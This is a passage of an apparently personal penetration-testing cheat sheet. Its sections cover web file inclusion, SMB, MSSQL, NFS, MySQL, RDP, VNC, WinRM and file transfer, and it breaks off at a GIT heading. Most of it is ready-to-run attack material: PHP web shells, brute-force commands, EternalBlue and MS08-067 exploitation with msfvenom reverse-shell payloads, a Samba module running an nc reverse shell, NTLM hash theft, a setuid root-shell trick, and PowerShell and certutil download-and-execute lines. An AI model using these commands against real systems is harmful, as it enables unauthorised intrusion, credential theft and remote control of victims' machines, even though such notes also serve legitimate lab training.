<h3 id="local-file-inclusion--remote-file-inclusion---lfi--rfi">Local File Inclusion / Remote File Inclusion - LFI / RFI</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
</code></pre></div></div>

<h4 id="wrappers">Wrappers</h4>

<h5 id="wrapper-phpfilter">Wrapper php://filter</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://example.com/index.php?page=php://filter/convert.base64-encode/resource=
</code></pre></div></div>

<h5 id="wrapper-expect">Wrapper expect://</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://example.com/index.php?page=expect://id
</code></pre></div></div>

<h5 id="wrapper-data">Wrapper data://</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo '&lt;?php phpinfo(); ?&gt;' | base64 -w0 -&gt; PD9waHAgcGhwaW5mbygpOyA/Pgo=

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=

If code execution, you should see phpinfo(), go to the disable_functions and craft a payload with functions which aren't disable.

Code execution with 
	- exec
	- shell_exec
	- system
	- passthru
	- popen

# Exemple
echo '&lt;?php passthru($_GET["cmd"]);echo "Shell done !"; ?&gt;' | base64 -w0 -&gt; PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=

If there is "Shell done !" on the webpage, then there is code execution and you can do things like :

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=&amp;cmd=ls
</code></pre></div></div>

<h5 id="wrapper-input">Wrapper input://</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -k -v "http://example.com/index.php?page=php://input" --data "&lt;?php echo shell_exec('id'); ?&gt;"
</code></pre></div></div>

<h4 id="useful-lfi-list">Useful LFI list</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Linux
/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt

# Windows
/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt

# Both
/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
</code></pre></div></div>

<h4 id="tools">Tools</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kadimus --url &lt;URL&gt;
python lfisuite.py
</code></pre></div></div>

<h3 id="command-injection">Command injection</h3>

<p>For command injection always use BurpSuite !</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
</code></pre></div></div>

<h3 id="deserialization">Deserialization</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
</code></pre></div></div>

<h3 id="file-upload">File upload</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
</code></pre></div></div>

<h3 id="sql-injection">SQL injection</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

https://blog.cobalt.io/a-pentesters-guide-to-sql-injection-sqli-16fd570c3532
</code></pre></div></div>

<h3 id="xss">XSS</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

beef-xss
cat /usr/share/beef-xss/config.yaml | grep user -C 1 # user / password
&lt;script src="http://&lt;IP&gt;:3000/hook.js"&gt;&lt;/script&gt;
</code></pre></div></div>

<h3 id="other-web-vulnerabilities">Other web vulnerabilities</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/swisskyrepo/PayloadsAllTheThings
</code></pre></div></div>

<h3 id="upload-a-file-with-put">Upload a file with PUT</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -X PUT http://&lt;IP&gt;/&lt;FILE&gt; -d @&lt;FILE&gt;  -v
</code></pre></div></div>

<hr />

<h2 id="kerberos---88">KERBEROS - 88</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
</code></pre></div></div>

<hr />

<h2 id="pop3---110">POP3 - 110</h2>

<h3 id="brute-force-3">Brute force</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l &lt;USER&gt; -P &lt;PASSWORDS_LIST&gt; -f &lt;IP&gt; pop3 -V
hydra -S -v -l &lt;USER&gt; -P &lt;PASSWORDS_LIST&gt; -s 995 -f &lt;IP&gt; pop3 -V
</code></pre></div></div>

<h3 id="read-mail">Read mail</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet &lt;IP&gt; 110

USER &lt;USER&gt;
PASS &lt;PASSWORD&gt;
LIST
RETR &lt;MAIL_NUMBER&gt;
QUIT
</code></pre></div></div>

<hr />

<h2 id="snmp---161">SNMP - 161</h2>

<h3 id="brute-force-community-string">Brute force community string</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>onesixtyone -c /home/liodeus/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt &lt;IP&gt;
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snmpbulkwalk -c &lt;COMMUNITY_STRING&gt; -v&lt;VERSION&gt; &lt;IP&gt;
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snmp-check &lt;IP&gt;
</code></pre></div></div>

<h3 id="modifying-snmp-values">Modifying SNMP values</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://net-snmp.sourceforge.net/tutorial/tutorial-5/commands/snmpset.html
</code></pre></div></div>

<hr />

<h2 id="ldap---389">LDAP - 389</h2>

<h3 id="scans">Scans</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -n -sV --script "ldap* and not brute"

ldapsearch -h &lt;IP&gt; -x -s base
ldapsearch -h &lt;IP&gt; -x -D '&lt;DOMAIN&gt;\&lt;USER&gt;' -w '&lt;PASSWORD&gt;' -b "DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;"
</code></pre></div></div>

<h3 id="graphical-interface">Graphical Interface</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jxplorer
</code></pre></div></div>

<hr />

<h2 id="smb---445">SMB - 445</h2>

<h3 id="version-if-nmap-didnt-detect-it">Version if nmap didn’t detect it</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sometimes nmap doesn’t show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.

OR

sudo ngrep -i -d &lt;INTERFACE&gt; 's.?a.?m.?b.?a.*[[:digit:]]' port 139
smbclient -L &lt;IP&gt;
</code></pre></div></div>

<h3 id="scan-for-vulnerability">Scan for vulnerability</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 &lt;IP&gt;
</code></pre></div></div>

<p>If :</p>

<ul>
  <li>MS17-010 - <a href="#EternalBlue (MS17-010)">EternalBlue</a></li>
  <li>MS08-067 - <a href="#MS08-067">MS08-067</a></li>
  <li>CVE-2017-7494 - <a href="#CVE-2017-7494">CVE-2017-7494</a></li>
</ul>

<h3 id="manual-testing">Manual testing</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap -H &lt;IP&gt;
smbmap -u '' -p '' -H &lt;IP&gt;
smbmap -u 'guest' -p '' -H &lt;IP&gt;
smbmap -u '' -p '' -H &lt;IP&gt; -R

crackmapexec smb &lt;IP&gt;
crackmapexec smb &lt;IP&gt; -u '' -p ''
crackmapexec smb &lt;IP&gt; -u 'guest' -p ''
crackmapexec smb &lt;IP&gt; -u '' -p '' --shares

enum4linux -a &lt;IP&gt;

smbclient --no-pass -L //$IP
smbclient //&lt;IP&gt;/&lt;SHARE&gt;

# Download all files from a directory recursively
smbclient //&lt;IP&gt;/&lt;SHARE&gt; -U &lt;USER&gt; -c "prompt OFF;recurse ON;mget *"
</code></pre></div></div>

<h3 id="brute-force-4">Brute force</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb &lt;IP&gt; -u &lt;USERS_LIST&gt; -p &lt;PASSWORDS_LIST&gt;
hydra -V -f -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; smb://&lt;IP&gt; -u -vV
</code></pre></div></div>

<h3 id="mount-a-smb-share">Mount a SMB share</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir /tmp/share
sudo mount -t cifs //&lt;IP&gt;/&lt;SHARE&gt; /tmp/share
sudo mount -t cifs -o 'username=&lt;USER&gt;,password=&lt;PASSWORD&gt;'//&lt;IP&gt;/&lt;SHARE&gt; /tmp/share

smbclient //&lt;IP&gt;/&lt;SHARE&gt;
smbclient //&lt;IP&gt;/&lt;SHARE&gt; -U &lt;USER&gt;
</code></pre></div></div>

<h3 id="get-a-shell">Get a shell</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

smbexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
smbexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

atexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt; &lt;COMMAND&gt;
atexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;
</code></pre></div></div>

<h3 id="eternalblue-ms17-010">EternalBlue (MS17-010)</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/3ndG4me/AutoBlue-MS17-010
</code></pre></div></div>

<h4 id="check-if-vulnerable">Check if vulnerable</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python eternal_checker.py &lt;IP&gt;
</code></pre></div></div>

<h4 id="prepare-shellcodes-and-listeners">Prepare shellcodes and listeners</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd shellcode
./shell_prep.sh
cd ..
./listener_prep.sh
</code></pre></div></div>

<h4 id="exploit">Exploit</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python eternalblue_exploit&lt;NUMBER&gt;.py &lt;IP&gt; shellcode/sc_all.bin

May need to run it multiple times
</code></pre></div></div>

<h4 id="if-this-doesnt-work-try-this-one">If this doesn’t work, try this one</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python zzz_exploit.py &lt;IP&gt;
</code></pre></div></div>

<h3 id="ms08-067">MS08-067</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Download exploit code
git clone https://github.com/andyacer/ms08_067.git

# Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
msfvenom -p windows/shell_bind_tcp RHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

# Modify
Modify ms08_067_2018.py and replace the shellcode variable by the one generated with msfvenom.

# Listener
nc -lvp &lt;PORT&gt;

# Exploit
python ms08_067_2018.py &lt;IP&gt; &lt;NUMBER&gt; 445
</code></pre></div></div>

<h3 id="cve-2017-7494">CVE-2017-7494</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Download exploit code
git clone https://github.com/joxeankoret/CVE-2017-7494
</code></pre></div></div>

<p>Create a new file named poc.c :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int samba_init_module(void)
{
	setresuid(0,0,0);
	system("ping -c 3 &lt;IP&gt;");
}
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Build
gcc -o test.so -shared poc.c -fPIC
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Start an ICMP listener
sudo tcpdump -i &lt;INTERFACE&gt; icmp

# Exploit
./cve_2017_7494.py -t &lt;TARGET_IP&gt; -u &lt;USER&gt; -P &lt;PASSWORD&gt; --custom=test.so
</code></pre></div></div>

<p>If you reiceve 3 pings on your listener then the exploit works. Now let’s get a shell :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int samba_init_module(void)
{
	setresuid(0,0,0);
	system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f");
}
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Build
gcc -o test.so -shared poc.c -fPIC
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Start a listener
nc -lvp &lt;PORT&gt;

# Exploit
./cve_2017_7494.py -t &lt;TARGET_IP&gt; -u &lt;USER&gt; -P &lt;PASSWORD&gt; --custom=test.so
</code></pre></div></div>

<hr />

<h2 id="mssql---1433">MSSQL - 1433</h2>

<h3 id="get-information">Get information</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 &lt;IP&gt;
</code></pre></div></div>

<h3 id="brute-force-5">Brute force</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; &lt;IP&gt; mssql -vV -I -u
</code></pre></div></div>

<h3 id="having-credentials">Having credentials</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mssqlclient.py -windows-auth &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
mssqlclient.py &lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;

# Once logged in you can run queries:
SQL&gt; select @@ version;

# Steal NTLM hash
sudo smbserver.py -smb2support liodeus .
SQL&gt; exec master..xp_dirtree '\\&lt;IP&gt;\liodeus\' # Steal the NTLM hash, crack it with john or hashcat

# Try to enable code execution
SQL&gt; enable_xp_cmdshell

# Execute code
SQL&gt; xp_cmdshell whoami /all
SQL&gt; xp_cmdshell certutil.exe -urlcache -split -f http://&lt;IP&gt;/nc.exe
</code></pre></div></div>

<h3 id="manual-exploit">Manual exploit</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cheatsheet :
	- https://www.asafety.fr/mssql-injection-cheat-sheet/
</code></pre></div></div>

<hr />

<h2 id="nfs---2049">NFS - 2049</h2>

<h3 id="show-mountable-nfs-shares">Show Mountable NFS Shares</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>showmount -e &lt;IP&gt;
nmap --script=nfs-showmount -oN mountable_shares &lt;IP&gt;
</code></pre></div></div>

<h3 id="mount-a-share">Mount a share</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo mount -v -t nfs &lt;IP&gt;:&lt;SHARE&gt; &lt;DIRECTORY&gt;
sudo mount -v -t nfs -o vers=2 &lt;IP&gt;:&lt;SHARE&gt; &lt;DIRECTORY&gt;
</code></pre></div></div>

<h3 id="nfs-misconfigurations">NFS misconfigurations</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># List exported shares
cat /etc/exports
</code></pre></div></div>

<p>If you find some directory that is configured as no_root_squash/no_all_squash you may be able to privesc.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Attacker, as root user

mkdir &lt;DIRECTORY&gt;
mount -v -t nfs &lt;IP&gt;:&lt;SHARE&gt; &lt;DIRECTORY&gt;
cd &lt;DIRECTORY&gt;
echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' &gt; pwn.c
gcc pwn.c -o pwn
chmod +s pwn

# Victim

cd &lt;SHARE&gt;
./pwn # Root shell
</code></pre></div></div>

<hr />

<h2 id="mysql---3306">MYSQL - 3306</h2>

<h3 id="brute-force-6">Brute force</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; &lt;IP&gt; mysql -vV -I -u
</code></pre></div></div>

<h3 id="extracting-mysql-credentials-from-files">Extracting MySQL credentials from files</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/mysql/debian.cnf
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
</code></pre></div></div>

<h3 id="connect">Connect</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Local
mysql -u &lt;USER&gt;
mysql -u &lt;USER&gt; -p

# Remote
mysql -h &lt;IP&gt; -u &lt;USER&gt;
</code></pre></div></div>

<h3 id="mysql-commands">MySQL commands</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>show databases;
use &lt;DATABASES&gt;;

show tables;
describe &lt;TABLE&gt;;

select * from &lt;TABLE&gt;;

# Try to execute code
select do_system('id');
\! sh

# Read &amp; Write
select load_file('&lt;FILE&gt;');
select 1,2,"&lt;?php echo shell_exec($_GET['c']);?&gt;",4 into OUTFILE '&lt;OUT_FILE&gt;'
</code></pre></div></div>

<h3 id="manual-exploit-1">Manual exploit</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cheatsheet :
	- https://www.asafety.fr/mysql-injection-cheat-sheet/
</code></pre></div></div>

<hr />

<h2 id="rdp---3389">RDP - 3389</h2>

<h3 id="brute-force-7">Brute force</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crowbar -b rdp -s &lt;IP&gt;/CIDR -u &lt;USER&gt; -C &lt;PASSWORDS_LIST&gt;
crowbar -b rdp -s &lt;IP&gt;/CIDR -U &lt;USERS_LIST&gt; -C &lt;PASSWORDS_LIST&gt;

hydra -f -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; rdp://&lt;IP&gt; -u -vV
</code></pre></div></div>

<h3 id="connect-with-known-credentials--hash">Connect with known credentials / hash</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rdesktop -u &lt;USERNAME&gt; &lt;IP&gt;
rdesktop -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; &lt;IP&gt;

xfreerdp /u:[DOMAIN\]&lt;USERNAME&gt; /p:&lt;PASSWORD&gt; /v:&lt;IP&gt;
xfreerdp /u:[DOMAIN\]&lt;USERNAME&gt; /pth:&lt;HASH&gt; /v:&lt;IP&gt;
</code></pre></div></div>

<h3 id="session-stealing">Session stealing</h3>

<h4 id="get-openned-sessions">Get openned sessions</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>query user
</code></pre></div></div>

<h4 id="access-to-the-selected">Access to the selected</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tscon &lt;ID&gt; /dest:&lt;SESSIONNAME&gt;
</code></pre></div></div>

<h3 id="adding-user-to-rdp-group-windows">Adding user to RDP group (Windows)</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net localgroup "Remote Desktop Users" &lt;USER&gt; /add
</code></pre></div></div>

<hr />

<h2 id="vnc---5800---58001---5900---5901">VNC - 5800 - 58001 - 5900 - 5901</h2>

<h3 id="scans-1">Scans</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p &lt;PORT&gt; &lt;IP&gt;
</code></pre></div></div>

<h3 id="brute-force-8">Brute force</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -L &lt;USERS_LIST&gt; –P &lt;PASSWORDS_LIST&gt; -s &lt;PORT&gt; &lt;IP&gt; vnc -u -vV
</code></pre></div></div>

<h3 id="connect-1">Connect</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vncviewer &lt;IP&gt;:&lt;PORT&gt;
</code></pre></div></div>

<h3 id="found-vnc-password">Found VNC password</h3>

<h4 id="linux">Linux</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Default password is stored in: ~/.vnc/passwd
</code></pre></div></div>

<h4 id="windows">Windows</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># RealVNC
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver

# TightVNC
HKEY_CURRENT_USER\Software\TightVNC\Server

# TigerVNC
HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4

# UltraVNC
C:\Program Files\UltraVNC\ultravnc.ini
</code></pre></div></div>

<h3 id="decrypt-vnc-password">Decrypt VNC password</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
irb
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt ["2151D3722874AD0C"].pack('H*'), fixedkey
/dev/nul
</code></pre></div></div>

<hr />

<h2 id="winrm---5985---5986">WINRM - 5985 - 5986</h2>

<h3 id="brute-force-9">Brute force</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec winrm &lt;IP&gt; -u &lt;USERS_LIST&gt; -p &lt;PASSWORDS_LIST&gt;
</code></pre></div></div>

<h3 id="connecting">Connecting</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -i &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt;
evil-winrm -i &lt;IP&gt; -u &lt;USER&gt; -H &lt;HASH&gt;
</code></pre></div></div>

<hr />

<h2 id="cgi">CGI</h2>

<h3 id="found-cgi-scripts">Found CGI scripts</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf -w /home/liodeus/wordlist/SecLists/Discovery/Web-Content/CGI-XPlatform.fuzz.txt -u &lt;URL&gt;/ccgi-bin/FUZZ -t 50
ffuf -w /home/liodeus/wordlist/SecLists/Discovery/Web-Content/CGIs.txt -u &lt;URL&gt;/ccgi-bin/FUZZ -t 50
ffuf -w /home/liodeus/directory-list-lowercase-2.3-medium.txt -u &lt;URL&gt;/cgi-bin/FUZZ -e .sh,.pl,.cgi -t 100
</code></pre></div></div>

<p>If a script is found try <a href="#shellshock">SHELLSHOCK</a>.</p>

<hr />

<h2 id="command-and-control-framework">Command and control framework</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Download
git clone https://github.com/mhaskar/Octopus/tree/v1.2

# Install requirements
pip install -r requirements.txt

# Usage
./octopus.py

# Listener (exemple)
listen_http &lt;BIND_IP&gt; &lt;BIND_PORT&gt; &lt;HOSTNAME&gt; &lt;INTERVAL_IN_SECONDS&gt; &lt;URL&gt; &lt;LISTENER_NAME&gt;
listen_http 0.0.0.0 80 192.168.1.87 5 test.php listener_1

# Agent (exemple)
generate_powershell &lt;LISTENER_NAME&gt;
generate_powershell listener_1
</code></pre></div></div>

<hr />

<h2 id="compiling-exploits">Compiling exploits</h2>

<h3 id="for-linux">For linux</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 64 bits
gcc -o exploit exploit.c

# 32 bits
gcc -m32 -o exploit exploit.c
</code></pre></div></div>

<h3 id="for-windows">For windows</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>To compile Win32 bit executables, execute i686-w64-mingw32-gcc -o &lt;FILE.exe&gt; &lt;FILE.c&gt;
To compile Win64 bit executables, execute x86_64-w64-mingw32-gcc -o &lt;FILE.exe&gt;&lt;FILE.c&gt;
To Compiled .cpp source file, execute i586-mingw32msvc-g++ -o &lt;FILE&gt;.exe &lt;FILE&gt;.cpp
To compile python scripts, pyinstaller --onefile &lt;SCRIPT.py&gt;

# Compile windows .exe on Linux
i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
</code></pre></div></div>

<h3 id="cross-compile">Cross compile</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c
</code></pre></div></div>

<hr />

<h2 id="dictionary-generation">DICTIONARY GENERATION</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cewl -m &lt;WORDS_SIZE&gt; --with-numbers -w dictiFromWebsite &lt;URL&gt; -d &lt;DEPTH&gt;
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crunch 5 5 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -t Test@ -o passwords.txt
</code></pre></div></div>

<hr />

<h2 id="file-transfer">FILE TRANSFER</h2>

<h3 id="linux-1">Linux</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># PYTHON
python -m SimpleHTTPServer &lt;PORT&gt;
python2.7 -c "from urllib import urlretrieve; urlretrieve('&lt;URL&gt;', '&lt;DESTINATION_FILE&gt;')"

# FTP
sudo python3 -m pyftpdlib  -p 21 -w

# SMB
sudo smbserver.py -smb2support liodeus .

# WGET
wget &lt;URL&gt; -o &lt;OUT_FILE&gt;

# CURL
curl &lt;URL&gt; -o &lt;OUT_FILE&gt;

# NETCAT
nc -lvp 1234 &gt; &lt;OUT_FILE&gt; 
nc &lt;IP&gt; 1234 &lt; &lt;IN_FILE&gt; 

# SCP
scp &lt;SOURCE_FILE&gt; &lt;USER&gt;@&lt;IP&gt;:&lt;DESTINATION_FILE&gt;
</code></pre></div></div>

<h3 id="windows-1">Windows</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># FTP 
echo open &lt;IP&gt; 21 &gt; ftp.txt echo anonymous&gt;&gt; ftp.txt echo password&gt;&gt; ftp.txt echo binary&gt;&gt; ftp.txt echo GET &lt;FILE&gt; &gt;&gt; ftp.txt echo bye&gt;&gt; ftp.txt
ftp -v -n -s:ftp.txt

# SMB
copy \\&lt;IP&gt;\&lt;PATH&gt;\&lt;FILE&gt; # Linux -&gt; Windows
copy &lt;FILE&gt; \\&lt;IP&gt;\&lt;PATH&gt;\ # Windows -&gt; Linux

# Powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('&lt;URL&gt;', '&lt;DESTINATION_FILE&gt;')
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('&lt;URL&gt;')
powershell "wget &lt;URL&gt;"

# Python
python.exe -c "from urllib import urlretrieve; urlretrieve('&lt;URL&gt;', '&lt;DESTINATION_FILE&gt;')"

# CertUtil
certutil.exe -urlcache -split -f "&lt;URL&gt;"

# NETCAT
nc -lvp 1234 &gt; &lt;OUT_FILE&gt; 
nc &lt;IP&gt; 1234 &lt; &lt;IN_FILE&gt;

# CURL
curl &lt;URL&gt; -o &lt;OUT_FILE&gt;
</code></pre></div></div>

<hr />

<h2 id="git">GIT</h2>

